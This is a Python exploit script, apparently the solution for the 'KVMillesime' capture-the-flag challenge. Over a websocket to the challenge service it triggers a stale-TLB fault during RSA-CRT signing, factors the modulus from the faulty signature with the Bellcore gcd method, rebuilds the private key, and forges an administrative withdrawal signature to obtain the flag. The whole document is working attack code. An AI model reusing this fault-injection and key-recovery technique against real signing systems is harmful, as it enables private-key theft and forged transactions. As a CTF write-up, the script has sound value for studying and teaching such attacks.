#!/usr/bin/env python3
import argparse
import math
import time

from Crypto.Util.number import inverse
from websockets.sync.client import connect

# Protocol Constants
CMD_GET_PUBKEY = 0x01
CMD_MINT_NFT = 0x02
CMD_BEGIN_MINDFULNESS = 0x03
CMD_WITHDRAW_FUNDS = 0x04
CMD_CHECK_SANCTIONS = 0x05
CMD_RESEED_PRNG = 0x06
CMD_STATUS_CHECK = 0x07


def send_command(ws, cmd, payload=b"", wait_resp=True, timeout=5.0):
    """Helper to send a command byte followed by optional payload."""
    message = bytes([cmd]) + payload
    ws.send(message)
    if wait_resp:
        try:
            return ws.recv(timeout=timeout)
        except Exception:
            return None
    return None


def solve_once(uri, recv_timeout=10.0):
    print(f"Connecting to {uri}...")

    try:
        with connect(uri) as ws:
            print("[+] Connected!")

            # 1. Ask nicely for a signature. Just so the guest has read its key at least once
            msg_str = b"TEST1".ljust(32, b"\0")
            print(f"Triggering MINT_NFT for message: {msg_str.strip().decode()}...")
            ws.send(bytes([CMD_MINT_NFT]) + msg_str)
            resp = ws.recv(timeout=recv_timeout)

            # 2. Trigger PTE Update (Session B)
            # This updates the physical pages for Session B, but the Guest's TLB is still Session A.
            print("Triggering Session B key rotation (HV PTE Mutation)...")
            resp = send_command(ws, CMD_BEGIN_MINDFULNESS, timeout=recv_timeout)
            if resp is not None:
                print("[+] Session B rotation successful.")

            # 3. Start Minting Operation
            # The Guest will load constants (p, dp, qInv) from the stale TLB (pointing to Session A).
            msg_str = b"TOO_EASY_4_ME".ljust(32, b"\0")
            print(f"Triggering MINT_NFT for message: {msg_str.strip().decode()}...")
            ws.send(bytes([CMD_MINT_NFT]) + msg_str)

            # Brief pause to ensure the Guest has loaded p_A and entered the SE sync loop.
            time.sleep(0.4)

            # 4. Thrash the Data TLB (DTLB) while the Guest is in the sync loop.
            # This causes the Guest to reload subsequent parameters (q, dq) from the new physical mapping.
            print("Harvesting RAM noise to thrash DTLB while Guest polls sync...")
            for i in range(2):
                resp = send_command(ws, CMD_RESEED_PRNG, timeout=recv_timeout)
                if resp is not None:
                    print(f"Noise harvest {i+1} complete.")

            print("TLB thrashed. Waiting for final faulty signature...")

            # 5. Collect the Mathematically Inconsistent Signature (p_A, q_B)
            resp = ws.recv(timeout=recv_timeout)

            if not resp or len(resp) < 129:
                print(
                    f"[-] Invalid response format. Length: {len(resp) if resp else 0}"
                )
                return False

            sig_faulty = int.from_bytes(resp[1:129], "little")
            print(f"[+] Received Faulty Signature: {hex(sig_faulty)[:32]}...")

            # 6. Fetch Modulus B
            print("Fetching Session B public key...")
            resp = send_command(ws, CMD_GET_PUBKEY, timeout=recv_timeout)
            if resp is None or len(resp) < 132:
                print("[-] Failed to fetch a valid public key response.")
                return False
            n_b = int.from_bytes(resp[:128], "little")
            e = int.from_bytes(resp[128:132], "little")
            print(f"[+] Modulus B: {hex(n_b)[:32]}...")

            # 7. Bellcore Factorization
            # pre-pad the message
            padded = bytearray(128)
            padded[:32] = msg_str[:32]
            padded[32] = 0x00
            for i in range(33, 126):
                padded[i] = 0xFF
            padded[126] = 0x01
            padded[127] = 0x00
            m = int.from_bytes(padded, "little")
            val = (pow(sig_faulty, e, n_b) - m) % n_b
            q_b = math.gcd(val, n_b)

            if q_b == 1 or q_b == n_b:
                print(
                    "[-] Factorization failed. The stale TLB entry might not have been evicted."
                )
                return False

            p_b = n_b // q_b
            print("Yay ! Modulus factored.")
            print(f"    p: {hex(p_b)[:32]}...")
            print(f"    q: {hex(q_b)[:32]}...")

            # 8. Forge Administrative Withdrawal Signature
            phi = (p_b - 1) * (q_b - 1)
            d_b = inverse(e, phi)

            target_msg = b"ADMIN_RUGPULL_ROI_1000X".ljust(32, b"\0")
            padded_target = bytearray(128)
            padded_target[:32] = target_msg[:32]
            padded_target[32] = 0x00
            for i in range(33, 126):
                padded_target[i] = 0xFF
            padded_target[126] = 0x01
            padded_target[127] = 0x00
            target_val = int.from_bytes(padded_target, "little")
            sig_forged = pow(target_val, d_b, n_b)
            sig_bytes = int.to_bytes(sig_forged, 128, "little")

            # 9. Claim Flag
            print("Sending forged withdrawal request...")
            resp = send_command(
                ws, CMD_WITHDRAW_FUNDS, target_msg + sig_bytes, timeout=recv_timeout
            )
            if resp and b"BZHCTF{" in resp:
                print(
                    f"\nFLAG: {resp.decode(errors='ignore').strip()}"
                )
                return True
            else:
                print("[-] Withdrawal rejected. Check Guest math engine sync.")
                return False

    except Exception as ex:
        import traceback
        traceback.print_exc()
        print(f"[-] Connection Error: {ex}")
        return False


def parse_args():
    parser = argparse.ArgumentParser(
        description="Exploit script for KVMillesime challenge"
    )
    parser.add_argument(
        "--host", default="localhost", help="Target host (default: localhost)"
    )
    parser.add_argument(
        "--port", type=int, default=1337, help="Target port (default: 1337)"
    )
    parser.add_argument(
        "--attempts",
        type=int,
        default=5,
        help="Number of exploit attempts before failing (default: 5)",
    )
    parser.add_argument(
        "--recv-timeout",
        type=float,
        default=10.0,
        help="Socket receive timeout in seconds (default: 10)",
    )
    return parser.parse_args()


def main():
    args = parse_args()
    uri = f"ws://{args.host}:{args.port}"

    for attempt in range(1, args.attempts + 1):
        print(f"Attempt {attempt}/{args.attempts}")
        if solve_once(uri, recv_timeout=args.recv_timeout):
            return

    raise SystemExit("[-] Exploit failed after all attempts.")

if __name__ == "__main__":
    main()
